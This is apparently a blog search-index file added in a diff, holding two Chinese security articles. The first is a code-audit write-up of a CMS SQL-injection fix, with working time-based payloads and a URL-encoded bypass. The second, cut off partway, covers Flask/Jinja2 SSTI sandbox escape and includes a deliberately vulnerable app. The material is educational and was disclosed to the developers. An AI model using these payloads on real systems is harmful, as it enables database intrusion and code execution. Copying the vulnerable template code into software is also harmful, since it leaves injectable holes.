@@ -1,0 +1,824 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>察言观色也能挖到0day？在聊天记录中的漏洞挖掘</title>
+    <url>/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
+    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>大家在做代码审计或者学习代码审计的过程中，会有大量是将对着代码。有时候会觉得代码枯燥无聊，看代码看到怀疑自我。</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image1.png" alt="timg"></p>
+<p>这时候不妨通过其他思路，换个思维，看点有趣的相关事务。回过头来再看代码，也许会有意想不到的惊喜！</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image2.jpg" alt="u=707466395,2665845091&amp;fm=26&amp;gp=0"></p>
+<h1 id="0x02-查看各种记录"><a href="#0x02-查看各种记录" class="headerlink" title="0x02 查看各种记录"></a>0x02 查看各种记录</h1><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>我在 GITHUB上找到了一个合适的开源 CMS<br>项目。在其官网上可以看到该CMS的更新的日志。</p>
+<p>查看更新日志（CHANGELOG）：</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image3.png" alt="98a48bd7461febafbe5a018afd5a47cf"></p>
+<p>我们可以看到 1.2.3 版本修复了一个 SQL 盲注 (Issue#19) 和 1.2.4版本修复了一个文件管理器上传漏洞 (Issue#20)。</p>
+<p>查看该 CMS 的代码结构，发现是基于 CodeIgniter 框架(后文简称 CI )进行的二次开发。对 CI 的相关类进行了继承，并自己封装了函数，进行一些特殊处理。</p>
+<h2 id="ISSUE记录"><a href="#ISSUE记录" class="headerlink" title="ISSUE记录"></a>ISSUE记录</h2><p>我们先来看下这个 SQL 盲注，首先访问下 GITHUB 上 Issue#19 的页面看下详情。</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image4.png" alt="1-f"></p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image5.png"></p>
+<p>这个是一个 1.2.2<br>版本上报的 ISSUE 信息，从中我们可以看出这位漏洞上报者来自 ABT 实验室。漏洞信息非常全面，格式优美，图文并茂。</p>
+<p>在 Issue 中不但给出了问题文件的路径是/core/MY_Security.php ，还给出了 Payload 细节：在前端登录时，User-Agent: ‘-( if( condition, sleep(5), 1))-‘’, ‘192.168.1.11’,’time’)# 。并且将漏洞产生原因进行了详细阐述：由于参数缺失，该 CMS 会记录下该登录包的信息，以”无效的 CSRF 防护”为原因写入数据库。但是信息中的 HTTP_USER_AGENT 这个参数未作任何检测，就直接拼接到 SQ L语句中，故造成了漏洞可以被利用。</p>
+<p>在最后漏洞上报者还给出了修复建议。</p>
+<p>我们根据给出了文件名找到了 1.2.2 版本的 MY_Securtiy.php 文件。</p>
+<p>MY_Securtiy 是继承 CI 框架的 CI_Security，并对其一些常用函数进行了封装扩展。</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image6.png"></p>
+<p>我们的目标函数 csrf_show_error<br>就是其中之一，我们现来看下该函数的调用过程：</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image7.png"></p>
+<p>调用在CI框架中的 Security.php 文件：在 csrf 验证时，如果 csrf_token 不合法，则会调用csrf_show_error 函数。所以我们在构建请求报文时，需要将 csrf_token 参数不设置或者改动一下。</p>
+<p>CI_Security中的csrf_show_error:只有错误显示</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image8.png"></p>
+<p>My_Security中的csrf_show_error:增加了对错误登录的记录入库并细分了错误种类</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image9.png"></p>
+<p>第45行，即漏洞上报者提到的condition，如果语句不会被执行，则count也不会增加，所以条件一直为true。</p>
+<p>第46行，可以看出直接将 $_SERVER[‘HTTP_USER_AGENT’] 拼接到 SQL 的 INSERT 语句中，并没有任何过滤，所以产生了SQL 注入。</p>
+<p>看起来简单明了，这个漏洞应该会被完美的修复掉。但事实上这个漏洞修复的过程并没有这么简单。在这个Issue#19中后续有一段很有趣的CMS开发者和漏洞上报者之间的对话记录，引起了我的兴趣：</p>
+<h2 id="聊天记录"><a href="#聊天记录" class="headerlink" title="聊天记录"></a>聊天记录</h2><p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image10.png"></p>
+<p>漏洞上报的版本为 1.2.2，而这时开发者已经开发出了 1.2.3-rev1版本，并且尝试修复这个 SQL 注入的问题，并希望漏洞上报者使用 1.2.3-rev1 来看看是否修复了此漏洞。</p>
+<p>这个漏洞上报者非常有耐心，他在实际尝试后发现问题并没有被修复的同时，还查看1.2.3-rev1 的 MY_Security.php 的代码。他告诉CMS开发者使用 xss_clean 函数并不能解决 SQL注入的问题，并且告诉他应该使用正确的函数为：escape-string 或者real_escape_string 这两个函数来防止 SQL 注入，并给出了这两个函数在PHP.NET 的官方链接和以及修复之后的代码以及测试结果。</p>
+<p>再来看之后的对话：</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image11.png"></p>
+<p>这个CMS开发者很勤奋，第二天就放出了 1.2.3-rev2 版本尝试修复了这个问题，并且再次邀请漏洞上报者测试是否修复此问题。</p>
+<p>漏洞上报者于当日确认已经修复，Payload 不再起作用，然后开发者关闭了此问题。至此一个开源 CMS 的安全问题被修复了。</p>
+<h1 id="0x03-从中所得"><a href="#0x03-从中所得" class="headerlink" title="0x03 从中所得"></a>0x03 从中所得</h1><h2 id="我们可以从中得到什么？"><a href="#我们可以从中得到什么？" class="headerlink" title="我们可以从中得到什么？"></a>我们可以从中得到什么？</h2><p>看起来一切正常，但是我们能从这段对话中得到什么呢？</p>
+<p>我们这个开发者是有基本安全意识的，该 CMS 包含 xxs_clean 函数，证明开发者在已经意识到 XSS 问题并且封装了相应的函数来做过滤处理。</p>
+<p>但是该开发者对于安全问题的细节认识并不太清晰。在碰到 SQL 注入问题时企图用 xss_clean 来解决这个问题，这点说明他对于 SQL 注入产生的原因和修复方法并不太明确。</p>
+<p>我们来看下GITHUB上 1.2.3-rev2 版本中开发者对于这个问题的修复方案：</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image12.png" alt="0a451716c68d391883eeee99d00c9dd5"></p>
+<p>开发者很听话，使用了 escape_string 来修复 SQL 注入的问题，做的很好。但是他并没有去掉 xss_clean 方法，而是在escape_string 调用之后仍然还继续调用xss_clean 方法。</p>
+<p>这是为什么呢？我们来尝试猜测开发者的想法：在1.2.3-rev2版本中使用xss_clean后未修复，于是加上了escape_string来修复该漏洞。xss_clean 是处理危险字符的方法，escape_string<br>也是处理危险字符的方法，两个过滤危险字符的方法叠加起来，理应是更安全的。就像两个 WAF 串联叠加，不应该是难上加难吗？</p>
+<p>但是事实可能并非如此，也许正是这种情况给了我们绕过机会！</p>
+<h2 id="绕过修复方案"><a href="#绕过修复方案" class="headerlink" title="绕过修复方案"></a>绕过修复方案</h2><p>首先看一下 escape_string 到底转义了哪些字符:</p>
+<p>下列字符受影响：</p>
+<ul>
+<li><p>  \x00</p>
+</li>
+<li><p>  \n</p>
+</li>
+<li><p>  \r</p>
+</li>
+<li><p>  \</p>
+</li>
+<li><p>  ‘</p>
+</li>
+<li><p>  &quot;</p>
+</li>
+<li><p>  \x1a</p>
+</li>
+</ul>
+<p>由于这段 SQL 注入是字符型，我们需要 ‘ 来闭合语句，但是 escape_string 会将 ‘ 变为 \‘ 从而阻止 SQL 注入。</p>
+<p>我们来看下 xss_clean 中的代码：</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image13.png"></p>
+<p>第 354-365 行是一个递归调用。</p>
+<p>第 368行是一个移除不可见字符的方法，如：\x00、\x01 等等。</p>
+<p>第 379-389 行是我们的关键代码，这段代码是判断 $str 参数中是否包含 % 字符，如果有的话就判定为需要 URL 解码并且调用 rawurldecode 来进行 URL 解码。</p>
+<p>这个不就是我们要找的代码吗？！</p>
+<p><strong>escape_string 方法并不会转义 % ，所以我们将 Payload 进行 URL 编码后并不会被 escape_string 方法改变任何内容。而当到达 xss_clean 时 Payload 将被 URL 解码，从而绕过了对 SQL 注入的过滤。</strong></p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image14.jpg" alt="timg"></p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>我们先来测试下原来的 Payload：</p>
+<p><strong>‘-( if((1=1), sleep(5), 1) )-‘’, ‘192.168.1.11’,’time’) #</strong></p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image15.png"></p>
+<p>没有造成延时，原 Payload 失败。</p>
+<p>新的 Payload 就是将原 Payload 进行 URL 编码，新 Payload：</p>
+<p><strong>%27%2d%28%20%69%66%28%28%31%3d%31%29%2c%20%73%6c%65%65%70%28%35%29%2c%20%31%29%20%29%2d%27%27%2c%20%27%31%39%32%2e%31%36%38%2e%31%2e%31%31%27%2c%27%74%69%6d%65%27%29%20%23</strong></p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image16.png" alt="cd72ba9ff13b71088cdeff98937359ad"></p>
+<p>造成延时成功，绕过修复方案，触发 SQL 时间盲注漏洞。</p>
+<h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><p>此漏洞在GITHUB中上报给了作者团队。</p>
+<p><img src="/2020/07/12/%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AF%9F%E8%A8%80%E8%A7%82%E8%89%B2%E4%B9%9F%E8%83%BD%E6%8C%96%E5%88%B00day%EF%BC%9F%E5%9C%A8%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image17.png"></p>
+<h6 id="此篇文章已投稿于公众号-酒仙桥六号部队"><a href="#此篇文章已投稿于公众号-酒仙桥六号部队" class="headerlink" title="此篇文章已投稿于公众号 - 酒仙桥六号部队"></a>此篇文章已投稿于公众号 - 酒仙桥六号部队</h6>]]></content>
+      <categories>
+        <category>原创文章</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于Flask SSTI，解锁你不知道的新姿势</title>
+    <url>/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>本文主要介绍笔者在学习 Flask SSTI<br>相关知识时，无意中解锁了新姿势。在研究原理后，从中挖掘出新的奇怪知识点~</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image1.jpeg"></p>
+<h2 id="0x02前置知识"><a href="#0x02前置知识" class="headerlink" title="0x02前置知识"></a>0x02前置知识</h2><h3 id="Flask-和-SSTI-介绍"><a href="#Flask-和-SSTI-介绍" class="headerlink" title="Flask 和 SSTI 介绍"></a>Flask 和 SSTI 介绍</h3><p><strong>Flask</strong> 是一个使用 Python 编写的轻量级 Web 应用框架。其 WSGI<br>工具箱采用 Werkzeug ，模板引擎则使用 Jinja2 。</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image2.png"></p>
+<p><strong>SSTI</strong> (Server-Side Template<br>Injection)，即服务端模板注入攻击。通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者<br>getshell 的目的。</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image3.png"></p>
+<h3 id="jinja2-语法"><a href="#jinja2-语法" class="headerlink" title="jinja2 语法"></a>jinja2 语法</h3><p>在 jinja2 中，存在三种语法：</p>
+<pre><code>控制结构 &#123;% %&#125;
+变量取值 &#123;&#123; &#125;&#125;
+注释 &#123;# #&#125;
+</code></pre>
+<p>jinja2 模板中使用 <code>&#123;&#123; &#125;&#125;</code><br>语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2<br>支持 Python 中所有的 Python 数据类型比如列表、字段、对象等。 jinja2<br>中的过滤器可以理解为是 jinja2 里面的内置函数和字符串处理函数。<br>被两个括号包裹的内容会输出其表达式的值。</p>
+<h3 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h3><p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image4.jpeg"></p>
+<p>jinja2 的 Python<br>模板解释器在构建的时候考虑到了安全问题，删除了大部分敏感函数，相当于构建了一个沙箱环境。但是一些内置函数和属性还是依然可以使用，而<br>Flask 的 SSTI<br>就是利用这些内置函数和属性相互组建来达到调用函数的目的，从而绕过沙箱。</p>
+<p><strong>函数和属性解析:</strong></p>
+<pre><code>__class__         返回调用的参数类型
+__bases__         返回基类列表
+__mro__           此属性是在方法解析期间寻找基类时的参考类元组
+__subclasses__()  返回子类的列表
+__globals__       以字典的形式返回函数所在的全局命名空间所定义的全局变量 与 func_globals 等价
+__builtins__      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-in 函数，例如eval, exec, open等等
+</code></pre>
+<p><strong>获取 object 类:</strong></p>
+<pre><code>&#39;&#39;.__class__.__mro__[2]     # 在 python2 中字符串在考虑解析时会有三个参考类 str basestring object
+&#39;&#39;.__class__.__mro__[1]     # 在 python3 中字符串在考虑解析时会有两个参考类 str object
+&#123;&#125;.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+</code></pre>
+<h2 id="0x03原理解读"><a href="#0x03原理解读" class="headerlink" title="0x03原理解读"></a>0x03原理解读</h2><h3 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h3><p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image6.jpeg"></p>
+<p>先来看下一个简单的 Flask SSTI 的实例：</p>
+<pre><code>from flask import Flask, request
+from jinja2 import Template
+
+app = Flask(__name__)
+
+@app.route(&quot;/&quot;)
+def index():
+    name = request.args.get(&#39;name&#39;, &#39;guest&#39;)
+    t = Template(&quot;Hello &quot; + name)             # 创建模板
+    return t.render()                         # 渲染
+
+if __name__ == &quot;__main__&quot;:
+    app.run();                                # 启动 flask ，默认 5000 端口
+</code></pre>
+<p>代码很简单，就是访问主页的时候 name 参数会被渲染到页面。</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image7.png" alt="pic2"></p>
+<p>可以看出来到这里有个反射型 XSS ，的确如此 XSS 就是这个位置有可能有 SSTI<br>的前奏。</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image8.png" alt="pic3"></p>
+<p>name参数后边也可以输入表达式之类的，例如:</p>
+<pre><code>name=&#123;&#123;2*2&#125;&#125; 
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image9.png" alt="pic4"></p>
+<pre><code>name=&#123;&#123;'abc'.upper()&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image10.png" alt="pic5"></p>
+<p>可以看到取表达式的值是可以成功的。但是一旦直接调用普通函数就会报错：</p>
+<pre><code>name=&#123;&#123;abs(-1)&#125;&#125;
+</code></pre>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image11.png" alt="pic6"></p>
+<p>后台显示 abs 未定义：</p>
+<p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image12.png" alt="pic7"></p>
+<h3 id="绕过沙箱"><a href="#绕过沙箱" class="headerlink" title="绕过沙箱"></a>绕过沙箱</h3><p><img src="/2020/07/13/%E5%85%B3%E4%BA%8EFlask-SSTI%EF%BC%8C%E8%A7%A3%E9%94%81%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%96%B0%E5%A7%BF%E5%8A%BF/image13.jpeg"></p>
+<p>我们来尝试获取 “()” 的类型：</p>
